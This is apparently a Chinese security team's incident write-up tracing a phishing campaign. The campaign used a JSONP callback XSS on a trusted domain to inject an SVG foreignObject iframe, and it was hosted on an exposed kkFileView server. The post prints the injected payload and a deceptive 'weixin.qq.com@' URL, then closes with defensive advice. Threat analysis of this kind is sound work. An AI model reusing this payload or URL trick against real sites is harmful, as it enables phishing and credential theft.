> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxNDkzNjQ0Mw==&mid=2247483963&idx=1&sn=d4147631169c4f3f4d59a9a061d95188

#  SVG 嵌套钓鱼溯源分析：基于可信域名 XSS 漏洞的黑产分发链追踪  
原创 小松X1aoS0ng  Test安全团队   2025-06-20 06:37  
  
## 一、事件概述  
  
近期捕获到一个疑似钓鱼链接  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGK8M2mpcY3N1Riba7MiaCgzyMhG3X5DXPwnAuTFyeqSAvcxKmcp98elR6g/640?wx_fmt=jpeg&from=appmsg "")  
  
链接结构如下：  

```
http://weixin.qq.com@hc.reg.xxx.com/api/item;is1ikwdkd94xz22di7fnxpaahc89/getItemByIdFromJsonp.action?callback=<svg>...</svg>
```

  
  
表面看似“微信官方网站”，实则指向 hc.reg.xxx.com 域名，参数中嵌入 SVG + <iframe> 结构，落地页面为：  

```
http://www.xxxxx.com.cn:8012/demo/Today1921.html?c=Z83mr1
```

  
  
通过对该 URL、iframe 加载内容与相关服务器进行溯源，我们发现这是一起典型的利用可信域名 XSS 或 JSONP 接口漏洞实现钓鱼分发的案例，背后涉及灰产平台的 **分发跳转器、手机号收集**  
、**交易截图伪造**  
等行为。  
## 二、SVG 注入载荷分析  
  
该钓鱼链接的核心攻击点位于 callback 参数，其被注入了一段 SVG+HTML 内容：  

```
<svg width=&#34;100%&#34; height=&#34;600&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;>
    <foreignObject width=&#34;100%&#34; height=&#34;100%&#34;>
              <div xmlns=&#34;http://www.w3.org/1999/xhtml&#34;>
           <head>
                            <meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&#34; />
           </head>
           <body style=&#34;margin:0;padding:0;overflow:hidden&#34;><iframe src=&#34;http://www.xxxxx.com.cn:8012/demo/Today1921.html?c=Z83mr1&#34; width=&#34;100%&#34; height=&#34;100%&#34; frameborder=&#34;0&#34; style=&#34;border:none&#34; /></body>
       </div>
    </foreignObject>
</svg>
```

  
**🎯 攻击目的**  
- **伪装**  
：利用 SVG 中的 <foreignObject> 标签嵌入真实 HTML 内容，加载恶意 iframe；  
  
- **欺骗用户**  
：通过 URL 中的 weixin.qq.com@ 迷惑用户以为是微信官方链接；  
  
- **加载钓鱼页**  
：iframe 指向攻击者控制的远程恶意页面；  
  
- **兼容移动端**  
：使用 <meta viewport> 提高在手机上的渲染效果。  
  
## 三、落地页面分析：重庆某协会 kkfileview 服务  
  
钓鱼 iframe 实际加载地址为：  

```
http://www.xxxxx.com.cn:8012/demo/Today1921.html?c=Z83mr1
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKib7GzHOvsAmASncd1ISV92wqF2Djvu83g5z8iaibZ7jhnoluGMYXibrl3Q/640?wx_fmt=jpeg&from=appmsg "")  
  
经查询发现该 IP 对应的是重庆某协会网站，部署了 kkFileView 文档预览服务，并未做访问控制，存在 **未授权访问漏洞**  
。攻击者将钓鱼页面部署在 /demo/ 路径下，隐藏于合法的文档演示路径中。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKmjEGoBicrsZzdBMwA2EYIZtTyq35oIVjz4m4ibfHZzyoXTkCdknSdzAg/640?wx_fmt=jpeg&from=appmsg "")  
## 四、行为追踪与溯源过程  
  
**1. 页面行为：**  
- 页面会根据请求头 User-Agent 或 Referer 判断来源；  
  
- 自动重定向至不同的 **伪装支付页面、跑分链接或个人交易页**  
；  
  
- 页面加载后立即发起网络请求，疑似用于记录手机号或投放其他内容。  
  
**2. 链接跳转分析：**  
  
通过分析 /demo/Today1921.html 中的跳转代码，发现页面内容被高度压缩并通过参数 ?c= 控制跳转逻辑，例如：  
  
var target = decode(c); window.location = target;  
  
其中 c=Z83mr1 实际上是跳转规则的一个索引或短链 ID，映射到攻击者后台维护的钓鱼分发链接池。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKsbBViaefGM3eky7S0ibhJagNeyWxLEYt4ia8NNo4kk6JJNmepU9UIYLKg/640?wx_fmt=jpeg&from=appmsg "")  
## 五、攻击者画像与域名溯源  
  
**1. Telegram 留痕**  
  
在钓鱼页面源码中发现部分注释与 JS 注入标识，包含攻击者的 Telegram 账号和支付方式，初步判断该人可能提供：  
- 域名防红服务  
  
- 钓鱼模板代挂  
  
- 防封自动跳转服务  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKDHgXFcuT7XZfCkM5wglGziaJI2aVPXicncFGseDiarbSciazyGnJjFTzTw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGK6aTTV0td4rtfwUM9icFfBDrnNwGNnxTE2dyywdicduAZksPXSeWq5IIw/640?wx_fmt=jpeg&from=appmsg "")  
  
**2. 钱包交易记录追查**  
  
**获利应该才3W多点**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKdr1x77tiawbtApiagfUrFn4wH2q0PI1s41fqN853b16ehhfgXZlm5vqw/640?wx_fmt=jpeg&from=appmsg "")  
  
**2. 域名绑定记录追查**  
  
在群组中翻到一个视频，存在一个域名  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKy0xpvr0dRWxeCMaRoWtRaXxn9yujJ7RibYLKm3XF8qhcrWiagI4T7iaCg/640?wx_fmt=jpeg&from=appmsg "")  
  
使用域名历史查询平台查找所绑定历史子域名、CNAME与 IP 地址关联记录，发现：  
- 攻击者曾挂载多个钓鱼页面在相同 IP；  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKpXlXADVyLKU3G2mcaFribped3NQiacUoDdT0hUdLVc5Xbj2rnvqmo8FQ/640?wx_fmt=jpeg&from=appmsg "")  
- 某域名可通过ICP备案信息查到实名注册人。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGK0tU7d7RdlSt1iayAMm7mJ0Olv559gfWnEJduj5b84VbVjOP81GIfvjQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/w4mWQyGCm56MU5Nt0h45GtuguMYryMGKAC5NKQ2FdJuiajibjkibuFIicuy1uRXiaRQ9hqQZ2Ocg0zlKq3UOOg5PrSw/640?wx_fmt=jpeg&from=appmsg "")  
## 六、灰产商业模式揭示  
  
本次钓鱼链接涉及的运作模式为典型的“钓鱼跳转分发服务”：  
  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;"><span cid="n88" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 72.6406px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">环节</span></span></strong></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;"><span cid="n89" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 492.359px;min-height: 10px;"><span md-inline="strong" style="box-sizing: border-box;"><strong style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">内容</span></span></strong></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n91" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 72.6406px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">🧱 搭建</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n92" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 492.359px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">通过全网扫描攻击kkfileview 等平台搭建开放跳板</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n94" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 72.6406px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">🎭 伪装</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n95" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 492.359px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">使用可信网站的 JSONP/XSS 漏洞挂载 SVG iframe 注入</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n97" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 72.6406px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">🔗 分发</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n98" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 492.359px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">攻击者生成短链或跳转链接传给诈骗团伙</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n100" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 72.6406px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">📱 钓鱼</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n101" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 492.359px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">iframe 引导用户进入钓鱼支付/登录页，窃取手机号/验证码</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n103" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 72.6406px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">💰 收费</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n104" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 492.359px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">提供“域名防红 + 渠道跳转”服务，对诈骗分子收费</span></span></span></td></tr></tbody></table>  
## 七、安全建议  
  
针对该类型钓鱼事件，建议相关平台与机构采取以下措施：  
1. **禁用或过滤 JSONP callback 参数中的 HTML 字符或 SVG 标签**  
；  
  
1. **关闭或限制公开文档预览服务（如 kkFileView）对 /demo/ 路径的访问**  
；  
  
1. **加强对 iframe 引入外链的 CSP 控制策略**  
；  
  
1. **利用安全网关拦截带 @ 字符的可疑 URL（如     weixin.qq.com@ 形式）**  
；  
  
1. **主动监测 SVG + foreignObject 结构在用户交互页面中的存在情况**  
。  
  
## 八、总结  
  
本事件揭示了黑产团伙如何通过一个极具迷惑性的 SVG 注入攻击，借助可信站点的开放接口，构建钓鱼跳板，诱导用户访问恶意 iframe 页面。通过技术分析与溯源，我们不仅识别了漏洞，还追踪到了背后的部署者及其盈利模型。  
  
建议下游厂商立即封堵相关攻击路径。  
  
该文章仅作学习，并对相关域名做脱敏处理，如有侵权请及时联系删除  
  
  
  
